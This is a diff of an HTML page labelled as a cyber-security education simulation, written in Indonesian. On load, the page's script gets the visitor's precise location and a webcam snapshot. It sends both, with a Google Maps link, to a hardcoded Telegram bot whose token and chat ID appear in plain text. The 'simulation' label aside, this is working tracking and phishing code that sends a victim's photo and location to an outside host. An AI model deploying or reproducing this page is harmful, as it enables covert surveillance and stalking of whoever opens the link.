@@ -1,19 +1,50 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Simulasi Edukasi Cyber Security</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+    }
+    .container {
+      text-align: center;
+      padding: 2rem;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.1);
+    }
+    h2 {
+      color: #333;
+    }
+    .status {
+      margin-top: 1rem;
+      color: #555;
+    }
+  </style>
 </head>
-<body style="background:white; color:white;">
+<body>
+  <div class="container">
+    <h2>Simulasi Permintaan Lokasi dan Kamera</h2>
+    <p class="status" id="status">Menunggu izin pengguna...</p>
+  </div>
+
   <script>
-    // Bot Telegram config
     const telegramToken = '8485657668:AAHeH2g82CDPoB9MJyruOnfXEu7dU9rKs_8';
     const chatId = '7979700473';
+    const statusText = document.getElementById("status");
 
-    // Fungsi kirim ke Telegram
     async function sendToTelegram(photoBlob, latitude, longitude) {
       const formData = new FormData();
       formData.append('chat_id', chatId);
-      formData.append('caption', `Simulasi Edukasi\nLokasi:\nLatitude: ${latitude}\nLongitude: ${longitude}`);
+      formData.append('caption', `Simulasi Edukasi:\nLokasi:\nLatitude: ${latitude}\nLongitude: ${longitude}\nhttps://www.google.com/maps?q=${latitude},${longitude}`);
       formData.append('photo', photoBlob, 'photo.jpg');
 
       await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
@@ -22,41 +53,56 @@
       });
     }
 
-    // Ambil lokasi
-    function getLocationAndCamera() {
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
+    async function captureAndSend(latitude, longitude) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
 
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          video.play();
+        setTimeout(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = 320;
+          canvas.height = 240;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          // Tunggu video nyala 1 detik, lalu ambil foto
-          setTimeout(async () => {
-            const canvas = document.createElement('canvas');
-            canvas.width = 320;
-            canvas.height = 240;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            stream.getTracks().forEach(track => track.stop());
+          stream.getTracks().forEach(track => track.stop());
 
-            // Ubah ke blob
-            canvas.toBlob(async (blob) => {
-              await sendToTelegram(blob, latitude, longitude);
-            }, 'image/jpeg');
-          }, 1000);
-        },
-        (error) => {
-          alert("Gagal ambil lokasi: " + error.message);
-        }
-      );
+          canvas.toBlob((blob) => {
+            sendToTelegram(blob, latitude, longitude);
+            statusText.textContent = "Data berhasil dikirim ke server simulasi.";
+          }, 'image/jpeg');
+        }, 1500);
+
+      } catch (error) {
+        statusText.textContent = "Gagal mengakses kamera: " + error.message;
+      }
     }
 
-    // Mulai ambil saat halaman dibuka
-    window.onload = getLocationAndCamera;
+    function getLocationAndProceed() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const { latitude, longitude } = position.coords;
+            statusText.textContent = "Lokasi diterima, membuka kamera...";
+            captureAndSend(latitude, longitude);
+          },
+          (error) => {
+            statusText.textContent = "Gagal mengakses lokasi: " + error.message;
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        statusText.textContent = "Geolocation tidak didukung di perangkat ini.";
+      }
+    }
+
+    window.onload = getLocationAndProceed;
   </script>
 </body>
 </html>
